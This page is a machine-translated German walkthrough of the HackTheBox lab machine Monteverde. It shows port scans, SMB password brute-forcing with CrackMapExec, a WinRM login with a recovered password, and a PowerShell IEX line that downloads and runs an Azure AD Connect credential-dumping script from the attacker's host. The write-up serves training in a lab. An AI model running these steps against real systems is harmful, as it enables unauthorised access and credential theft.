<!doctype html>
<html class="no-js" lang="de">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>⁉️ 🌐 🤹🏿 HackTheBox. Exemplarische Vorgehensweise Monteverde. Brute SMB und LPE durch Azure Admins 🅱️ 👩🏾‍💼 🏹</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ich veröffentliche weiterhin Lösungen, die zur weiteren Verarbeitung von der HackTheBox- Site gesendet wurden . 
 
 In diesem Artikel erzwingen wir da...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox. Exemplarische Vorgehensweise Monteverde. Brute SMB und LPE durch Azure Admins</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/506524/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/2m/jp/6q/2mjp6qqz5acr6edjuiddifkccba.png" alt="Bild"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich veröffentliche weiterhin Lösungen, die zur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">weiteren Verarbeitung</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> von der </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox-</font></a><font style="vertical-align: inherit;"> Site </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">gesendet</font></a><font style="vertical-align: inherit;"> wurden </font><font style="vertical-align: inherit;">. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In diesem Artikel erzwingen wir das SMB-Kennwort brutal und erhöhen die Berechtigungen für einen Administrator im Namen eines Mitglieds der Azure Admins-Gruppe. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Verbindung zum Labor erfolgt über VPN. </font><font style="vertical-align: inherit;">Es wird empfohlen, keine Verbindung von einem Arbeitscomputer oder von einem Host aus herzustellen, auf dem die für Sie wichtigen Daten verfügbar sind, da Sie in einem privaten Netzwerk mit Personen landen, die sich mit Informationssicherheit auskennen :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Organisationsinformationen</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Aufklärung</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieser Computer hat eine IP-Adresse 10.10.10.172, die ich zu / etc / hosts hinzufüge.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.172    monteverde.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zuerst scannen wir offene Ports. </font><font style="vertical-align: inherit;">Da das Scannen aller Ports mit nmap sehr lange dauert, werde ich dies zunächst mit masscan tun. </font><font style="vertical-align: inherit;">Wir scannen alle TCP- und UDP-Ports von der tun0-Schnittstelle mit einer Geschwindigkeit von 500 Paketen pro Sekunde.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.172   --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/yp/hs/eu/yphseupjfeatcziqzpsdtm6ibdk.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der Host hat viele offene Ports. </font><font style="vertical-align: inherit;">Scannen Sie sie nun mit nmap, um die gewünschten zu filtern und auszuwählen.</font></font><br>
<br>
<pre><code class="bash hljs">nmap monteverde.htb -p49778,88,593,49667,53,445,5985,49675,9389,3268,49706,389,464,49674,139,636,135,3269,49673</code></pre><br>
<img src="https://habrastorage.org/webt/9s/nm/af/9snmafnjta1vi4pimoszjcrkuna.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Für detailliertere Informationen zu den Diensten, die an Ports ausgeführt werden, führen wir nun einen Scan mit der Option -A durch.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A monteverde.htb -p88,593,53,445,5985,9389,3268,389,464,139,636,135,3269</code></pre><br>
<img src="https://habrastorage.org/webt/rt/sl/ls/rtsllshrzwl12ltl_fvtthege_o.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Überprüfen Sie zunächst SMB. </font><font style="vertical-align: inherit;">Wir machen das mit enum4linux. </font><font style="vertical-align: inherit;">So erhalten wir Benutzer sowie deren Mitgliedschaft in der Gruppe.</font></font><br>
<br>
<pre><code class="bash hljs">enum4linux -a monteverde.htb</code></pre><br>
<img src="https://habrastorage.org/webt/i1/fs/_e/i1fs_egwv74fjcmdeyl289hvxzu.png" alt="Bild"><br>
<br>
<img src="https://habrastorage.org/webt/wk/p-/vt/wkp-vtupeimqujldarc0-asqtje.png" alt="Bild"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BENUTZER</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie üblich, während wir nach einem Einstiegspunkt suchen, erzwingen Sie gleichzeitig Brute-Force-Passwörter. </font><font style="vertical-align: inherit;">Da die Kennwortrichtlinie die Mindestanzahl von Zeichen im Kennwort 7 festlegt, werden die folgenden Listen erstellt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ej/fy/cs/ejfycsenpvvgxdrzyld_uglz3iw.png" alt="Bild"><br>
<br>
<img src="https://habrastorage.org/webt/as/uq/ha/asuqhaidrv20psgmiznpzi9n_bq.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Führen Sie nun das Brute mit CrackMapExec aus.</font></font><br>
<br>
<pre><code class="bash hljs">cme smb monteverde.htb -u ./users.txt -p ./passwords.txt</code></pre><br>
<img src="https://habrastorage.org/webt/sz/9u/ds/sz9udsiuuzkyp-hqwq-ybfnaw1q.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und überraschenderweise war es ein Erfolg - wir haben die Benutzeranmeldeinformationen gefunden. </font><font style="vertical-align: inherit;">Sehen wir uns die Ressourcen an, die dem Benutzer zur Verfügung stehen.</font></font><br>
<br>
<pre><code class="bash hljs">cme smb monteverde.htb -u SABatchJobs -p SABatchJobs --shares</code></pre><br>
<img src="https://habrastorage.org/webt/j7/vb/gt/j7vbgtgwfxct1jtd3futqhj1uqq.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wenden Sie sich an die $ resource des Benutzers.</font></font><br>
<br>
<pre><code class="bash hljs">smbclient -U SABatchJobs%SABatchJobs //10.10.10.172/users$</code></pre><br>
<img src="https://habrastorage.org/webt/hk/ya/fy/hkyafylcwfw3myg_dygntrjkfse.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Schauen wir uns rekursiv alle Dateien auf dem Server an. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2h/yz/5o/2hyz5omvy1cgspc_npsoelyavui.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und mal sehen, was in der Datei ist. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/uh/-w/qi/uh-wqiidqdkvoxrlfxfpoivwtre.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Stellen Sie nun eine Verbindung zu WinRM her und holen Sie sich das Benutzerflag.</font></font><br>
<br>
<pre><code class="bash hljs">evil-winrm -i 10.10.10.172 -u mhope -p <span class="hljs-string">'4n0therD4y@n0th3r$'</span></code></pre><br>
<img src="https://habrastorage.org/webt/r5/tq/bn/r5tqbnh4qqmfz_lgu8ydkjsyty8.png" alt="Bild"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WURZEL</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sehen wir uns die Benutzerinformationen an. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ek/6g/qb/ek6gqb9-9_eba2lx6cbovpucwoe.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Er ist Mitglied der Azure Admins-Gruppe - dies ist ein LPE-Vektor. </font><font style="vertical-align: inherit;">Wir verwenden </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Azure-ADConnect</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , um eine Verbindung zur Azure-Datenbank </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">herzustellen</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Wir laden das Skript vom lokalen Server in den Speicher auf dem Remotecomputer und führen es aus.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://10.10.15.60/Azure-ADConnect.ps1'</span>)<font></font>
Azure<span class="hljs-literal">-ADConnect</span> <span class="hljs-literal">-server</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-db</span> ADSync</code></pre><br>
<img src="https://habrastorage.org/webt/6h/gx/jy/6hgxjyx9ldw_agzi7alx5wqedc0.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir erhalten die Administratoranmeldeinformationen. </font><font style="vertical-align: inherit;">Wir verbinden uns und holen die Flagge ab. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/z6/mq/yp/z6mqypiofscgatdbad9rogrjero.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir haben die volle Kontrolle über die Maschine. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie können sich uns </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">per Telegramm anschließen</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Dort finden Sie interessante Materialien, zusammengeführte Kurse sowie Software. </font><font style="vertical-align: inherit;">Stellen wir eine Community zusammen, in der es Menschen gibt, die sich in vielen Bereichen der IT auskennen. Dann können wir uns in Fragen der IT und der Informationssicherheit immer gegenseitig helfen.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de506506/index.html">Zuordnung von JSON-Daten zu einer C ++ - Struktur</a></li>
<li><a href="../de506508/index.html">Hängemattengetriebene Entwicklung: "Schlaf ist ein wichtiger Teil der Arbeit eines Programmierers"</a></li>
<li><a href="../de506510/index.html">Burnout [% Staatsangestellter%] = Faktor (Vielleicht <Marktwirtschaft>)</a></li>
<li><a href="../de506516/index.html">Speichern Sie das Passwort: eine fabelhafte Implementierung des Shamir Secret Sharing-Schemas in Python</a></li>
<li><a href="../de506520/index.html">Konferenz DEVOXX UK. Wählen Sie ein Framework: Docker Swarm, Kubernetes oder Mesos. Teil 1</a></li>
<li><a href="../de506530/index.html">So wählen Sie eine USV</a></li>
<li><a href="../de506532/index.html">Durch Dornen zu den Sternen: Stellen Sie ein Gerät her, mit dem Sie einen Laserpointer auf ein beliebiges Himmelsobjekt richten können</a></li>
<li><a href="../de506538/index.html">Wie Wikipedia Ihre persönlichen Daten preisgeben kann und wie es sie tatsächlich verwendet</a></li>
<li><a href="../de506542/index.html">DIY Videoaufnahme in die Cloud</a></li>
<li><a href="../de506548/index.html">Praktischer Einsatz von Kotlin in Startups und Unternehmen</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>